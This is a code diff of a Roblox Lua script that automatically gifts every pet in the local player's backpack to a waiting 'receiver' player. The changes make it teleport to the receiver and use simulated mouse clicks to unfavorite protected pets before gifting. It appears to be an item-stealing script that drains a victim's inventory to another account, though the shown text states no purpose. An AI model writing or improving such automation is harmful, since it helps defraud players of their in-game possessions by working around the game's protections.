@@ -472,15 +472,36 @@ local function isPetFavorited(petName)
     return pet:GetAttribute("Favorited") or false
 end
 
-local function unfavoritePet(petName)
-    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
-    if pet then
-        if isPetFavorited(petName) then
-            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
-            return true
-        end
-    end
-    return false
+local function doubleClickPet(pet)
+    local character = LocalPlayer.Character
+    if not character then return false end
+    
+    pet.Parent = character
+    task.wait(0.1)
+    
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return false end
+    
+    local tool = character:FindFirstChild(pet.Name)
+    if not tool then return false end
+    
+    local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")
+    if not handle then return false end
+    
+    local camera = workspace.CurrentCamera
+    if not camera then return false end
+    
+    local pos = camera:WorldToViewportPoint(handle.Position)
+    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 1)
+    task.wait(0.1)
+    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 1)
+    task.wait(0.1)
+    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 1)
+    task.wait(0.1)
+    VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 1)
+    
+    pet.Parent = LocalPlayer.Backpack
+    return true
 end
 
 local function giftPet(targetPlayer, petName)
@@ -522,16 +543,7 @@ local function teleportToPlayer(targetPlayer)
         task.wait(0.1)
     end
     
-    -- Position behind the target player
-    local offset = (targetRoot.CFrame.LookVector * -3) + Vector3.new(0, 1, 0)
-    root.CFrame = targetRoot.CFrame + offset
-    
-    -- Adjust camera to look at the target
-    local camera = workspace.CurrentCamera
-    if camera then
-        camera.CFrame = CFrame.new(camera.CFrame.Position, targetRoot.Position)
-    end
-    
+    root.CFrame = targetRoot.CFrame + Vector3.new(3,1,0)
     return true
 end
 
@@ -684,21 +696,7 @@ local function clickPlayerScreen(targetPlayer)
     if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return false end
     
     local camera = workspace.CurrentCamera
-    if not camera then return false end
-    
-    -- Position behind the target player
-    teleportToPlayer(targetPlayer)
-    
-    -- Adjust camera to look at the target
-    local targetRoot = getRoot(targetPlayer.Character)
-    camera.CFrame = CFrame.new(camera.CFrame.Position, targetRoot.Position)
-    
-    -- Zoom out a bit for better visibility
-    if camera:IsA("Camera") then
-        camera.FieldOfView = 70
-    end
-    
-    local pos, visible = camera:WorldToViewportPoint(targetRoot.Position)
+    local pos, visible = camera:WorldToViewportPoint(targetPlayer.Character.HumanoidRootPart.Position)
     if not visible then return false end
     
     local x, y = pos.X, pos.Y
@@ -736,9 +734,8 @@ local function startGifting(targetPlayer)
 
         for _, pet in ipairs(pets) do
             if checkForGiftNotification() then
-                if unfavoritePet(pet.fullName) then
-                    task.wait(0.1)
-                end
+                doubleClickPet(pet.instance)
+                task.wait(0.5)
             end
 
             if equipSinglePet(pet.fullName) then
@@ -747,6 +744,8 @@ local function startGifting(targetPlayer)
                 
                 while attempts < 3 and not success do
                     attempts = attempts + 1
+                    
+                    teleportToPlayer(targetPlayer)
                     
                     if clickPlayerScreen(targetPlayer) then
                         task.wait(0.1)
@@ -761,10 +760,9 @@ local function startGifting(targetPlayer)
                             success = true
                             task.wait(0.1)
                         elseif promptStatus == "favorited" then
-                            if unfavoritePet(pet.fullName) then
-                                task.wait(0.1)
-                                equipSinglePet(pet.fullName)
-                            end
+                            doubleClickPet(pet.instance)
+                            task.wait(0.5)
+                            equipSinglePet(pet.fullName)
                         else
                             task.wait(0.1)
                         end
@@ -787,4 +785,5 @@ task.wait(2)
 local receiver = waitForReceiver()
 if not receiver then return end
 
+teleportToPlayer(receiver)
 startGifting(receiver)
